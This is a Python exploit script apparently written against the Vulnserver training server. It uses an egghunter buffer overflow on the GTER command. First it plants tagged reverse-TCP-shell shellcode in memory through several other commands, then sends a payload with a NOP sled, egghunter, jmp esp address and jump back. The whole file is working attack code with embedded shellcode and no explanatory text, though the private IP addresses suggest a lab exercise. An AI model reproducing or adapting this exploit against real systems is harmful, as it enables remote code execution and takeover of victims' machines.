#!/usr/bin/python

import socket
import os
import sys

host = "192.168.56.101"
port = 9999

# Reverse tcp shell to 192.168.56.1:8443
buf =  ""
buf += "\xb8\xb6\x06\x76\xea\xda\xd3\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\xf5\x08\x94"
buf += "\x1f\x05\xfc\xda\xe0\xf5\xfd\xba\x69\x10\xcc\xfa\x0e"
buf += "\x51\x7f\xcb\x45\x37\x8c\xa0\x08\xa3\x07\xc4\x84\xc4"
buf += "\xa0\x63\xf3\xeb\x31\xdf\xc7\x6a\xb2\x22\x14\x4c\x8b"
buf += "\xec\x69\x8d\xcc\x11\x83\xdf\x85\x5e\x36\xcf\xa2\x2b"
buf += "\x8b\x64\xf8\xba\x8b\x99\x49\xbc\xba\x0c\xc1\xe7\x1c"
buf += "\xaf\x06\x9c\x14\xb7\x4b\x99\xef\x4c\xbf\x55\xee\x84"
buf += "\xf1\x96\x5d\xe9\x3d\x65\x9f\x2e\xf9\x96\xea\x46\xf9"
buf += "\x2b\xed\x9d\x83\xf7\x78\x05\x23\x73\xda\xe1\xd5\x50"
buf += "\xbd\x62\xd9\x1d\xc9\x2c\xfe\xa0\x1e\x47\xfa\x29\xa1"
buf += "\x87\x8a\x6a\x86\x03\xd6\x29\xa7\x12\xb2\x9c\xd8\x44"
buf += "\x1d\x40\x7d\x0f\xb0\x95\x0c\x52\xdd\x5a\x3d\x6c\x1d"
buf += "\xf5\x36\x1f\x2f\x5a\xed\xb7\x03\x13\x2b\x40\x63\x0e"
buf += "\x8b\xde\x9a\xb1\xec\xf7\x58\xe5\xbc\x6f\x48\x86\x56"
buf += "\x6f\x75\x53\xf8\x3f\xd9\x0c\xb9\xef\x99\xfc\x51\xe5"
buf += "\x15\x22\x41\x06\xfc\x4b\xe8\xfd\x97\xb3\x45\xc5\x66"
buf += "\x5c\x94\x35\x49\x67\x11\xd3\xe3\x87\x74\x4c\x9c\x3e"
buf += "\xdd\x06\x3d\xbe\xcb\x63\x7d\x34\xf8\x94\x30\xbd\x75"
buf += "\x86\xa5\x4d\xc0\xf4\x60\x51\xfe\x90\xef\xc0\x65\x60"
buf += "\x79\xf9\x31\x37\x2e\xcf\x4b\xdd\xc2\x76\xe2\xc3\x1e"
buf += "\xee\xcd\x47\xc5\xd3\xd0\x46\x88\x68\xf7\x58\x54\x70"
buf += "\xb3\x0c\x08\x27\x6d\xfa\xee\x91\xdf\x54\xb9\x4e\xb6"
buf += "\x30\x3c\xbd\x09\x46\x41\xe8\xff\xa6\xf0\x45\x46\xd9"
buf += "\x3d\x02\x4e\xa2\x23\xb2\xb1\x79\xe0\xc2\xfb\x23\x41"
buf += "\x4b\xa2\xb6\xd3\x16\x55\x6d\x17\x2f\xd6\x87\xe8\xd4"
buf += "\xc6\xe2\xed\x91\x40\x1f\x9c\x8a\x24\x1f\x33\xaa\x6c"

# Run all commands in hope that one of them will store our egg in executable memory
def place_egg(shellcode):
    commands = ["STATS ", "RTIME ", "LTIME ", "SRUN ", "TRUN ", "GMON ", "GDOG ", "HTER ", "LTER ", "KSTAN "]
    egg = "W00TW00T" + "\x90" * 16 + shellcode

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.recv(1024)

    for c in commands:
        sock.send(c + egg)
        sock.recv(1024)

# Place the main shellcode and tag in memory
place_egg(buf)

jmp_esp_addr = "\xaf\x11\x50\x62"

# NtAccessCheck-based egghunter
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + "W00T" + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# payload = nop_sled + egghunter + ebp_filler (doesn't matter) + jmp_esp_addr + nop_sled + jump_to_egghunter
payload = (147 - len(egghunter)) * "\x90" + egghunter + 4 * "B" + jmp_esp_addr + 4 * "\x90" + "\xE9\x5C\xFF\xFF\xFF"
command = "GTER " + payload + "\n"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

sock.recv(1024)

sock.send(command)
sock.close()
